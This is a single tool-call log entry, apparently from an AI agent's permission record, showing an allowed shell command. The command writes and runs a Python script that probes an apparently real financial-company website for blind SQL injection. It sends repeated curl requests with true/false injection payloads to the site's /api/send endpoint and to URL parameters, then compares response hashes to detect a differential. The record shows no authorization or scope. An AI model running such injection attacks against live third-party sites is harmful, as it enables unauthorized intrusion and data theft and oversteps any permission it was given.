{"ts": 1790726124.0758016, "decision_id": "05dc6d53ec62", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > tool_outputs/robust.py <<'PYEOF'\nimport subprocess, hashlib, urllib.parse, time\nT=\"https://www.infinitycapital.bh\"\ndef fetch(url, n=6):\n    hs=[]\n    for i in range(n):\n        subprocess.run([\"curl\",\"-s\",\"-o\",\"/tmp/r.bin\",\"-w\",\"%{http_code}|%{size_download}\",\"-H\",\"Cache-Control: no-cache\",url],\n                       capture_output=True,text=True)\n    # majority\n    return open(\"/tmp/r.bin\",\"rb\").read()\ndef majority(url, n=5):\n    res={}\n    for i in range(n):\n        r=subprocess.run([\"curl\",\"-s\",\"-o\",\"/tmp/r.bin\",\"-w\",\"%{http_code}|%{size_download}|%{content_type}\",\n                          \"-H\",\"Cache-Control: no-cache\",url],capture_output=True,text=True).stdout.strip()\n        h=open(\"/tmp/r.bin\",\"rb\").read()\n        key=(r, hashlib.sha256(h).hexdigest()[:10])\n        res[key]=res.get(key,0)+1\n        time.sleep(0.3)\n    return res\ndef stable(url,label,params_true,params_false,n=5):\n    mt=majority(url+(\"&\" if \"?\" in url else \"?\")+urllib.parse.urlencode(params_true),n)\n    mf=majority(url+(\"&\" if \"?\" in url else \"?\")+urllib.parse.urlencode(params_false),n)\n    print(f\"=== {label}\")\n    print(\"  TRUE :\",mt)\n    print(\"  FALSE:\",mf)\n    # compare only 200 responses\n    t2=[k for k,v in mt.items() if v>=n-1 and k[0].startswith(\"200\")]\n    f2=[k for k,v in mf.items() if v>=n-1 and k[0].startswith(\"200\")]\n    if t2 and f2 and t2[0][1]!=f2[0][1]:\n        print(\"  >>> DIFFERENTIAL DETECTED (majority 200 bodies differ)\")\n        return True\n    print(\"  >>> no reliable differential (challenge noise or identical)\")\n    return False\n\n# /api/send SQLi via POST params - use json body\nimport json\ndef post_majority(body, ct, n=5):\n    res={}\n    for i in range(n):\n        r=subprocess.run([\"curl\",\"-s\",\"-X\",\"POST\",\"-H\",\"Content-Type: \"+ct,\"--data\",body,\n          T+\"/api/send\",\"-o\",\"/tmp/rp.bin\",\"-w\",\"%{http_code}|%{size_download}\"],capture_output=True,text=True).stdout.strip()\n        h=open(\"/tmp/rp.bin\",\"rb\").read()\n        k=(r,hashlib.sha256(h).hexdigest()[:10])\n        res[k]=res.get(k,0)+1\n        time.sleep(0.4)\n    return res\nfor label,pl in [(\"api-send-json-name-sqli\",(\"name' AND 1=1-- -\",\"name' AND 1=2-- -\")),\n                 (\"api-send-json-msg-sqli\",(\"m' AND 1=1-- -\",\"m' AND 1=2-- -\"))]:\n    print(\"===\",label)\n    t=post_majority(json.dumps({\"name\":pl[0],\"email\":\"a@b.c\",\"message\":\"x\"}),\"application/json\")\n    f=post_majority(json.dumps({\"name\":pl[1],\"email\":\"a@b.c\",\"message\":\"x\"}),\"application/json\")\n    print(\"  TRUE :\",t); print(\"  FALSE:\",f)\nPYEOF\ntimeout 280 python3 tool_outputs/robust.py 2>&1 | tee tool_outputs/robust.log"}
